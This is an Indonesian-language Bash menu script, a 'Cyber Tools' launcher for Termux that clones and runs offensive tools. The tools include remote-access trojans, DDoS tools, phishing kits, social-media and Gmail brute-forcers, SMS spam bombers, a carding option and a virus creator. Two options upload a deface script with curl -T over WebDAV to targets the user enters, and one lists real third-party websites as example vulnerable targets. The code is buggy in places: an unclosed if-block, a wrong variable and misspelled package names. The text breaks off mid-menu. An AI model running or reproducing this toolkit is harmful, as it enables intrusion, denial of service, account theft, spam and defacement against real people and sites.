clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
endc='\E[0m'
sleep 1
toilet -f big -F gay "<==MR.Z==>" | lolcat
figlet "CYBER TEAM" |lolcat
cowsay -f ghostbusters "/Author By Pak BOSS!!" |lolcat




echo ""
echo "$white MOHON DI BACA DULU PAK BOSS, AUTHORNYA.."
echo ""
echo "$red############################################################"
echo "TOOLS       : CYBER TOOLS V.1" |lolcat
echo "CREATED BY  : MR.Z" |lolcat
echo "NOTICE      : NEXT UPDATE TOOLS V.2" |lolcat
echo "CONTACT     : 08123456789" |lolcat
date |lolcat
echo "$red############################################################"
sleep 1
echo ""
echo "$white Pilih Tools Yang Mau Di Jalankan Pak BOSS!!"
echo ""
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo " 1.> A-RAT INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo " 2.> ASTRA NMAP INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo " 3.> AUXSCAN INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo " 4.> BINGOO INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo " 5.> BLACK-HYDRA INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo " 6.> BOT FACEBOOK" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo " 7.> BOT FB AUTO REACTION" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo " 8.> BOT LIKE FACEBOOK" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo " 9.> BOT KOMEN FACEBOOK" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "10.> BOT INSTAGRAM" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "11.> BROWSING DI TERMUX" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "12.> CARI CC BUAT CARDING"
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "13.> CARI PANEL LOGIN ADMIN WEB" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "14.> CARI PANEL ADMIN UPLOAD" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "15.> CARI IP ORANG LAIN" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "16.> CEK SPESIFIKASI/SPEK PONSEL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "17.> CHATINGAN DI TERMUX" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "18.> CUPP INSTALL BUAT BIKIN WORDLIST" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "19.> CMS-MAP INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "20.> DDOS WEBSITE TORSHAMMER TOOLS" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "21.> DDOS WEBSITE LITE TOOLS" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "22.> DDOS WEBSITE XERXES TOOLS" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "23.> DDOS WEBSITE KAWAI-BOTNET TOOLS" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "24.> DENGERIN MUSIK YOUTUBE DI TERMUX" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "25.> DEFACE METHOD WEBDAV" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "26.> DEFACE BRUTE WEBDAV" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "27.> DEFACE POC WEBDAV" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "28.> DIRSEARCH INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "29.> DIEJOUBU TOOLS INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "30.> EROR-CYBER TOOLS INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "31.> EZSPLOIT INSTALL (ROOT)" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "32.> FAT RAT INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "33.> FUCKING-RAT INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "34.> GADO-GADO TOOLS" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "35.> GOOGLE DORK TERBARU" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "36.> HACK FACEBOOK BRUTE" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "37.> HACK INSTAGRAM BRUTE" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "38.> HACK GMAIL BRUTE" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "39.> HASHER INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "40.> HASH BUSTER INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "41.> HN INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "42.> HUNNER FRAMEWORK INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "43.> HUMAN LEVEL CONTROL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "44.> HONEYPOT INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "45.> HYDRA INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "46.> IP DDOS INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "47.> IP GEO LOCATION" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "48.> INFORMATION GATHERING "
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "49.> JOOMSCAN INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "50.> KATOLIN TOOLS" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "51.> KALI LINUX NETHUNTER" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "52.> KALI UBUNTU INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "53.> KILLER INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "54.> KO-DORK  INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "55.> LAZYMUX BUAT INSTALL TOOLS" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "56.> LAZY SQLMAP INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "57.> LHST INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "58.> LINUX FEDORA INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "59.> LOKOMEDIA EXPLOITERS INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "60.> MD5-CRACK INSTALL " |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "61.> MEMPERCEPAT/MENSTABILKAN JARINGAN HP" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "62.> METASPLOIT INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "63.> MOONBUGGY GAME DI TERMUX" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "64.> MAIN TEBAK-TEBAKAN GAME DI TERMUX" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "65.> NUYUL BITCOIN" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "66.> NGROK INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "67.> OWASP-NETTACKER INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "68.> OWSCAN INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "69.> PHISING WEEMAN INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "70.> PHISING ML & COC INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "71.> PHISING SOCIAL FISH" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "72.> RECONDOG INFORMATION GATHERING INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "73.> RED-HAWK INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "74.> SCRIPT DEFACE ORANG" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "75.> SPAM GMAIL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "76.> SPAM SMS MULTI" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "77.> SPAM SMS LITE" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "78.> SPAM TELEPHONE & EMAIL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "79.> SPAM SMS TOKOPEDIA" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "80.> SPAM SMS TELKOMSEL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "81.> SPAM SMS MATAHARI MALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "82.> SPAM SMS HOOQ TV" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "83.> SPAM SMS JD.ID" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "84.> SPAM SMS KFC" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "85.> SPAM SMS PHD" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "86.> SPAM SMS WHISKAS" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "87.> SPAM SMS ZIPAY" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "88.> SQLSCAN INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "89.> SQLMAP INJECTION INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "90.> TERMUX-A INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "91.> TXTOOLS INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "92:> TUTORIALTERMUX" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "93,> VBUG MAKER VIRUS CREATOR" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "94.> VISQL INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "95.> VULN SCANNER WEB INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "96.> WASCAN INSTALL" |lolcat
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo "97.> WHOIS LOOKUP INSTALL" |lolcat
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<" |lolcat
echo "98.>KELUAR"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>" |lolcat
echo ""
echo "$white========================================================="
read -p "Masukan Nomor Tools Pak BOSS >>" mytools;

if [ $mytools = 1 ] || [ $mytools = 1 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
git clone https://github.com/Xi4u7/A-Rat.git
mv A-Rat $HOME
cd $HOME/A-Rat
python2 A-Rat.py
fi

if [ $mytools = 2 ] || [ $mytools = 2 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "AstraNmap" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install sh
pip2 install sh
git clone https://github.com/Gameye98/AstraNmap
mv AstraNmap $HOME
cd $HOME/AstraNmap
sh astranmap.sh
fi

if [ $mytools = 3 ] || [ $mytools = 3 ]
then
clear
cowsay -f kiss.cow "<=MR.Z>" | lolcat
figlet "AUXSCAN" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install python
apt install python2
git clone https://github.com/Gameye98/Auxscan2.0.git
mv Auxscan2.0 $HOME
cd $HOME/Auxscan2.0
python2 auxscan.py
fi

if [ $mytools = 4 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
git clone https://github.com/Hood3dRob1n/BinGoo
mv BinGoo $HOME
cd $HOME/BinGoo
bash bingoo
fi

if [ $mytools = 5 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "BLACKHYDRA" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install python
apt install python2
git clone https://github.com/Gameye98/Black-Hydra.git
mv Black-Hydra $HOME
cd $HOME/Black-Hydra
python2 blackhydra.py
fi

if [ $mytools = 6 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
cd module
python2 facebook.py
fi

if [ $mytools = 7 ]
then
clear
toilet "<=MR.Z=>"
cd module
python2 auto_reaction.py
fi

if [ $mytools = 8 ]
then
clear
toilet "<=MR.Z=>"
cd module
php autolike.php
fi

if [ $mytools = 9 ]
then
clear
figlet "<=MR.Z=>" | lolcat
cd module
python2 botkomen.py
fi

if [ $mytools = 11 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "<=MR.Z=>" | lolcat
sleep 1
pkg install w3m
w3m www.google.com
fi

if [ $mytools = 12 ]
then
clear
toilet "<=MR.Z=>"
cd module
php key.php
fi

if [ $mytools = 13 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
git clone https://github.com/DarknessCyberTeam/Scan-Website-Admin-Login
mv Scan-Website-Admin-Login $HOME
cd $HOME/Scan-Website-Admin-Login
python2 Admin-Login.py
fi

if [ $mytools = 14 ]
then
clear
toilet "<=MR.Z=>"
cd module
python2 upf.py
fi

if [ $mytools = 15 ]
then
clear
figlet "<=MR.Z=>" | lolcat
netstat - an

if [ $mytools = 16 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
pkg install neofetech
neofetech
fi

if [ $mytools = 17 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/Us11rFsJb7A"
sleep 5
pkg install irssi
irssi
fi

if [ $mytools = 18 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/yIf57xxWaoI"
sleep 5
pkg install git
pkg install python2
git clone https://github.com/mebus/cupp.git
mv cupp $HOME
cd $HOME/cupp
python2 cupp.py
fi

if [ $mytools = 19 ]
then
clear
toilet -f big -F gay "<=MR.Z=>" | lolcat
sleep 1
echo -e $green "Sedang Menginstall"
sleep 1
apt-get update
apt-get upgrade
pkg install python
apt-get install git
git clone https://github.com/Dionach/CMSmap.git
mv CMSmap $HOME
cd $HOME/CMSmap
ls
fi

if [ $mytools = 20 ]
then
clear
figlet "TORSHAMMER" |lolcat
Pkg install python
Pkg install git
git clone http://github.com/cyweb/hammer
cd hammer
python hammer.py
fi

if [ $mytools = 21 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/EskgepQSB7U"
sleep 3
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $mytools = 22 ]
then
clear
toilet -f slant --gay "<=MR.Z=>"
apt update && apt upgrade
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
clear
read -p "[MasukanWebsiteTarget]>" target
./xerxes target 80
fi

if [ $mytools = 23 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "<=MR.Z=>" | lolcat
sleep 1
apt update && apt upgrade
apt install php
apt install git
git clone https://github.com/Cvar1984/Kawai-Botnet
mv Kawai-Botnet $HOME
cd $HOME/Kawai-Botnet
read -p "[Masukan Website Target]>:" target
php kawai.php target 4 0 9999
fi

if [ $mytools = 24 ]
then
clear
cowsay -f eyes.cow "<=MR.Z=>" | lolcat
figlet "MP3 YOUTUBE" | lolcat
sleep 1
pkg update && pkg upgrade
pkg install pip
pkg install python
pkg install python2
pip install mps_youtube
pip install youtube_dl
pkg install mpv
mpsyt
fi

if [ $mytools = 25 ]
then
clear
echo "\033[34;1m"
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet -f slant MR.Z
echo "\033[37;1m"
echo "Masukan Web target"
echo "Contoh Web Target vuln"
echo "  http://bestilling.udir.no/"
echo "  http://560560.ru/"
echo "  http://myownemailer.com/"
echo "  http://Zoocentral.co.za/"
echo "  http://50-50-50.ru/"
echo "  http://tirupurjobs.net/"
echo "  http://Matrimony.co.za/"
echo "  http://Bheh.co.za/"
read -p "[MrB4J1N64N]>" target
echo "Masukan Nama script kalian"
echo "yang ada di Luar Folder Ruang Penyimpanan"
read -p "[MR.Z]>" script
curl -T /storage/emulated/0/$script $target
echo "\033[33;1m"
echo "Selesai! Tod Cek di $target $script "
fi

if [ $mytools = 26 ]
then
clear
toilet -f standard -F gay "BruteWebdav"
echo "\033[32;1mauthor: <=MR.Z=>"
echo "Masukan nama script"
read -p "[=======>" script
echo "\033[32;1m"
echo "Masukan Web Target Ke1"
read -p "[=======>" Ke1
curl -T /storage/emulated/0/$script $Ke1
echo "\033[32;1m" "Masukan Web Target Ke2 "
read -p "[=======>" Ke2
curl -T /storage/emulated/0/$script $Ke2
echo "\033[32;1m" "Masukan Web Target Ke3"
read -p "[=======>" Ke3
curl -T /storage/emulated/0/$script $Ke3
echo "\033[32;1m" "Masukan Web Target Ke4"
read -p "[=======>" Ke4
curl -T /storage/emulated/0/$script $Ke5
echo "\033[32;1m" "Masukan Web Target Ke5"
read -p "[=======>" Ke5
curl -T /storage/emulated/0/$script $Ke5
echo "\033[32;1m" "Masukan Web Target Ke6"
read -p "[=======>" Ke6
curl -T /storage/emulated/0/$script $Ke6
echo "\033[32;1m" "Masukan Web Target Ke7"
read -p "[=======>" Ke7
curl -T /storage/emulated/0/$script $Ke7
echo "\033[32;1m" "Masukan Web Target Ke8"
read -p "[=======>" Ke8
curl -T /storage/emulated/0/$script $Ke8
echo "\033[32;1m" "Masukan Web Target Ke9"
read -p "[=======>" Ke9
curl -T /storage/emulated/0/$script $Ke9
echo "\033[32;1m" "Masukan Web Target Ke10"
read -p "[=======>" Ke10
curl -T /storage/emulated/0/$script $Ke10
sleep 1
echo "[<=====================SEDANG PROSES=====================>]"
echo "Silahkan Cek Web $Ke1/$script"
echo "Silahkan Cek Web $Ke2/$script"
echo "Silahkan Cek Web $Ke3/$script"
echo "Silahkan Cek Web $Ke4/$script"
echo "Silahkan Cek Web $Ke5/$script"
echo "Silahkan Cek Web $Ke6/$script"
echo "Silahkan Cek Web $Ke7/$script"
echo "Silahkan Cek Web $Ke8/$script"
echo "Silahkan Cek Web $Ke9/$script"
echo "Silahkan Cek Web $Ke10/$script"
echo "[=============HAPPY DEFACE=============]"
fi

if [ $mytools = 27 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
apt install git
apt install bash
pip2 install bash
git clone https://github.com/ALX-04/iesDEFACE
mv iesDEFACE $HOME
cd $HOME/iesDEFACE
bash iesDeface.sh
fi

if [ $mytools = 28 ]
then
clear
toilet -f big -F gay "<=MR.Z=>"
sleep 1
apt update
apt upgrade
apt install python
apt install git
git clone https://github.com/maurosoria/dirsearch.git
mv  dirsearch $HOME
cd $HOME/dirsearch
ls
fi

if [ $mytools = 29 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
apt install git
apt install php
git clone https://github.com/alintamvanz/diejoubu
mv diejoubu $HOME
cd $HOME/diejoubu
cd v1.2
php diejoubu.php
fi

if [ $mytools = 30 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
git clone https://github.com/MrKeepSmile/errorcybertool.git
mv errorcybertool $HOME
cd $HOME/errorcybertool
chmod 777 errorcyber
./errorcyber
fi

if [ $mytools = 31 ]
then
clear
toilet -f big -F gay "<=MR.Z=>"
sleep 1
apt update
apt upgrade
apt install git
git clone https://github.com/rand0m1ze/ezsploit
mv ezsploit $HOME
cd $HOME/ezsploit
bash ezsploit.sh
fi

if [ $mytools = 32 ]
then
clear
"<=MR.Z=>"
sleep 1
apt-get update && apt-get upgrade
apt-get install git
git clone https://github.com/Screetsec/TheFatRat.git
mv TheFatRat $HOME
cd $HOME/TheFatRat
chmod +x setup.sh
./setup.sh
fi

if [ $mytools = 33 ]
then
clear
toilet -f big -F gay "<=MR.Z=>" | lolcat
sleep 1
apt update
apt upgrade
apt install git
apt install python2
git clone https://github.com/kereh/Fucking-Rat
mv Fucking-Rat $HOME
cd $HOME/Fucking-Rat
python2 fr.py
fi

if [ $mytools = 34 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
apt update && apt upgrade
apt install ruby
apt install lolcat
apt install git
git clone https://github.com/Senitopeng/GadoGado.git
mv GadoGado $HOME
cd $HOME/GadoGado
bash gado
fi

if [ $mytools = 36 ]
then
clear
figlet "HACK FB" | lolcat
pkg install python2
cd data
python2 mbf.py
fi

if [ $mytools = 37 ]
then
clear
figlet "HACK" | lolcat
figlet "INSTAGRAM" | lolcat
cd data
python2 hackinsta.py wordlist.txt
fi

if [ $mytools = 38 ]
then
clear
figlet "HACK" | lolcat
figlet "GMAIL" | lolcat
cd data
python2 gmail.py wordlist.txt
fi

if [ $mytools = 39 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "<=MR.Z=>" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install python
apt install python2
git clone https://github.com/CiKu370/hasher.git
mv hasher $HOME
cd $HOME/hasher
python2 hash.py
fi

if [ $mytools = 40 ]
then
clear
toilet -f mono12 -F gay "<=MR.Z=>"
apt upgrade
apt install python2
apt install git
git clone https://github.com/UltimateHackers/Hash-Buster
mv Hash-Buster $HOME
cd $HOME/Hash-Buster
python2 hash.py
fi

if [ $mytools = 41 ]
then
clear
toilet -f big -F gay "<=MR.Z=>" | lolcat
sleep 1
apt update
apt upgrade
apt install git
apt install python2
git clone https://github.com/kereh/HN-Installer
mv HN-Installer $HOME
cd $HOME/HN-Installer
python2 HN-Install.py
fi

if [ $mytools = 42 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
apt update
apt install git
git clone https://github.com/b3-v3r/Hunner.git
mv Hunner $HOME
cd $HOME/Hunner
chmod +x hunner.py
python2 hunner.py
fi

if [ $mytools = 43 ]
then
clear
toilet -f big -F gay "<=MR.Z=>"
sleep 1
apt update
apt upgrade
apt install git
apt install php
git clone https://github.com/whackashoe/Human_Level_Control_through_Deep_Reinforcement_Le$
mv Human_Level_Control_through_Deep_Reinforcement_Learning $HOME
